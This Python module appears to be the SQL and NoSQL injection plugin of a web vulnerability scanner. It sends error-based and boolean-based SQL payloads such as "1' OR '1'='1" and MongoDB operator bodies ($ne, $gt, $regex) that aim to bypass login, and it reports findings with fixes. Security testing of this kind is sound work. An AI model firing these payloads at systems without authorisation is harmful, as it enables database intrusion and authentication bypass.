"""
modules/sqli.py — SQL Injection + NoSQL Injection
OWASP A03:2021 - Injection
"""
from __future__ import annotations

import re
import time
import asyncio
from typing import List, Optional
from urllib.parse import quote

from core.plugins import BasePlugin
from core.models import Finding, ScanResult, CVSS_PROFILES
from payloads.database import SQLI, NOSQLI, PayloadMutator


class SQLiPlugin(BasePlugin):
    NAME           = "sqli"
    DESCRIPTION    = "SQL Injection (error-based, blind time-based) + NoSQL Injection"
    OWASP_CATEGORY = "A03:2021 - Injection"
    TAGS           = ["sqli", "nosqli", "injection", "database", "critical"]

    _ERROR_RE = re.compile("|".join(SQLI["error_patterns"]), re.IGNORECASE)
    _NOSQL_RE = re.compile("|".join(NOSQLI["error_patterns"]), re.IGNORECASE)

    # Parameters to fuzz
    _PARAMS = ["id", "q", "search", "user", "username", "email",
               "name", "page", "sort", "filter", "category", "type",
               "product_id", "user_id", "order_id", "item"]

    async def run(self, target: str, result: ScanResult) -> List[Finding]:
        self.log("Starting Enterprise-grade SQL/NoSQL injection scan")
        findings: List[Finding] = []
        all_endpoints = result.discovered_endpoints or [target]
        # Cap at 15 most interesting endpoints for speed
        endpoints = all_endpoints[:15]
        self.log(f"Testing {len(endpoints)} of {len(all_endpoints)} endpoints")

        for url in endpoints:
            # Test key parameters (capped at 5 for speed)
            for param in self._PARAMS[:5]:
                finding = await self.detect_with_confirmation(url, param)
                if finding:
                    findings.append(finding)
            
            # Additional NoSQL and POST tests
            findings.extend(await self._test_post_sqli(url))
            findings.extend(await self._test_nosql(url))

        for f in findings:
            self.add(f)
            result.add_finding(f)

        self.log(f"Scan complete. Found {len(findings)} confirmed or probable issues")
        return findings

    async def detect_with_confirmation(self, url: str, param: str) -> Optional[Finding]:
        """
        Premium 3-Stage Confirmation Logic:
        1. Error-based (Surface Detection)
        2. Boolean-based (Logic Validation)
        3. Time-based (Execution Proof)
        """
        evidence_map = {
            "status_match": False,
            "pattern_match": False,
            "time_based": False,
            "boolean_based": False
        }
        confirmation_evidence = []
        
        # --- PHASE 1: Error-Based (Surface) ---
        error_payload = "1' OR '1'='1"
        test_url = f"{url}?{param}={quote(error_payload, safe='')}"
        resp_err = await self.engine.get(test_url)
        
        if resp_err and self._ERROR_RE.search(resp_err.body):
            evidence_map["pattern_match"] = True
            confirmation_evidence.append("SQL Error Pattern Detected in Response")

        # --- PHASE 2: Boolean-Based (Logic) ---
        # Compare TRUE vs FALSE conditions
        payload_true = "1' AND '1'='1"
        payload_false = "1' AND '1'='2"
        
        r_true = await self.engine.get(f"{url}?{param}={quote(payload_true, safe='')}")
        r_false = await self.engine.get(f"{url}?{param}={quote(payload_false, safe='')}")
        
        if r_true and r_false and r_true.status == 200:
            len_diff = abs(len(r_true.body) - len(r_false.body))
            if r_true.status != r_false.status or len_diff > 20:
                evidence_map["boolean_based"] = True
                confirmation_evidence.append(f"Boolean Logic Confirmed (Diff: {len_diff} bytes in responses)")

        # --- PHASE 3: Time-Based (skipped — 4s timeout makes this unreliable) ---
        # evidence_map["time_based"] = False

        # --- FINAL CALCULATION ---
        f = Finding(
            vuln_type       = "SQL Injection",
            endpoint        = url,
            method          = "GET",
            parameter       = param,
            payload         = error_payload,
            response_status = resp_err.status if resp_err else 0,
            severity        = "HIGH", # Default, will upgrade if confirmed
            cvss_score      = CVSS_PROFILES["SQLI"]["score"],
            cvss_vector     = CVSS_PROFILES["SQLI"]["vector"],
            owasp_category  = self.OWASP_CATEGORY,
            module          = self.NAME,
            confirmation_evidence = confirmation_evidence
        )

        confidence = f.calculate_confidence(evidence_map)
        
        if confidence >= 0.5:
            # Upgrade severity based on confidence
            if confidence >= 0.8:
                f.severity = "CRITICAL"
                f.confirmed = True
                f.title = f"CRITICAL: Confirmed SQL Injection in '{param}'"
            else:
                f.severity = "HIGH"
                f.title = f"Probable SQL Injection in '{param}'"
            
            f.description = (
                f"Automated multi-stage analysis identified a vulnerability in parameter '{param}'. "
                f"Validation steps: {len(confirmation_evidence)} signals confirmed."
            )
            f.recommendation = "Implement parameterized queries (prepared statements) to prevent SQL command injection."
            return f
        
        return None

    async def _test_post_sqli(self, url: str) -> List[Finding]:
        """Tests POST body fields for SQL injection."""
        findings: List[Finding] = []
        payload = "' OR '1'='1"

        bodies = [
            {"username": payload, "password": "test"},
            {"email": payload},
            {"search": payload},
        ]
        resps = await asyncio.gather(
            *[self.engine.post(url, json=b) for b in bodies],
            return_exceptions=True
        )

        for body, resp in zip(bodies, resps):
            if isinstance(resp, Exception) or not resp:
                continue
            if self._ERROR_RE.search(resp.body):
                key = list(body.keys())[0]
                f = Finding(
                    vuln_type       = "SQL Injection (POST Body)",
                    title           = f"SQL Injection in POST Field '{key}'",
                    endpoint        = url,
                    method          = "POST",
                    parameter       = key,
                    payload         = str(body),
                    response_status = resp.status,
                    response_body   = resp.body[:600],
                    severity        = "CRITICAL",
                    cvss_score      = CVSS_PROFILES["SQLI"]["score"],
                    cvss_vector     = CVSS_PROFILES["SQLI"]["vector"],
                    owasp_category  = self.OWASP_CATEGORY,
                    description     = f"SQL error in POST body field '{key}'.",
                    recommendation  = "Sanitize all POST body fields with parameterized queries.",
                    confirmed       = True,
                    module          = self.NAME,
                    tags            = ["sqli", "post"],
                )
                findings.append(f)
                self.log(f"POST SQLi: {url} field={key}", "FOUND")
                break
        return findings

    async def _test_nosql(self, url: str) -> List[Finding]:
        """Tests NoSQL injection via operator injection in GET params and POST body."""
        findings: List[Finding] = []

        # 1. URL param injection
        for payload in NOSQLI["url_params"][:3]:
            test_url = f"{url}?username{payload}&password{payload}"
            resp = await self.engine.get(test_url)
            if resp and self._NOSQL_RE.search(resp.body):
                findings.append(self._nosql_finding(url, payload, "GET param"))
                self.log(f"NoSQLi (GET): {url}", "FOUND")
                return findings

        # 2. JSON body operator injection
        bodies = [
            {"username": {"$ne": None}, "password": {"$ne": None}},
            {"username": {"$gt": ""}, "password": {"$gt": ""}},
            {"username": {"$regex": ".*"}},
        ]
        resps = await asyncio.gather(
            *[self.engine.post(url, json=b) for b in bodies],
            return_exceptions=True
        )
        for body, resp in zip(bodies, resps):
            if isinstance(resp, Exception) or not resp:
                continue
            # Successful login (200 + token in body) after operator injection = confirmed
            success = (resp.status == 200 and
                       any(kw in resp.body.lower()
                           for kw in ["token", "access_token", "session", '"id"']))
            if success or self._NOSQL_RE.search(resp.body):
                findings.append(self._nosql_finding(url, str(body), "POST JSON body"))
                self.log(f"NoSQLi (POST): {url}", "FOUND")
                break

        return findings

    def _nosql_finding(self, url, payload, location) -> Finding:
        return Finding(
            vuln_type       = "NoSQL Injection",
            title           = "NoSQL Operator Injection (MongoDB)",
            endpoint        = url,
            method          = "POST" if "body" in location else "GET",
            parameter       = location,
            payload         = str(payload)[:200],
            severity        = "CRITICAL",
            cvss_score      = CVSS_PROFILES["NOSQLI"]["score"],
            cvss_vector     = CVSS_PROFILES["NOSQLI"]["vector"],
            owasp_category  = self.OWASP_CATEGORY,
            description     = (
                f"MongoDB operator injection via {location}. Operators like $ne, $gt, $regex "
                f"allow bypassing authentication and extracting data without valid credentials."
            ),
            recommendation  = (
                "1. Sanitize inputs — strip/reject MongoDB operators ($ne, $gt, $where, etc.).\n"
                "2. Use strict schema validation (Mongoose strict mode).\n"
                "3. Disable the $where operator globally in MongoDB.\n"
                "4. Apply allowlist validation for all query parameters."
            ),
            references      = ["https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection"],
            confirmed       = True,
            module          = self.NAME,
            tags            = ["nosqli", "mongodb", "injection"],
        )
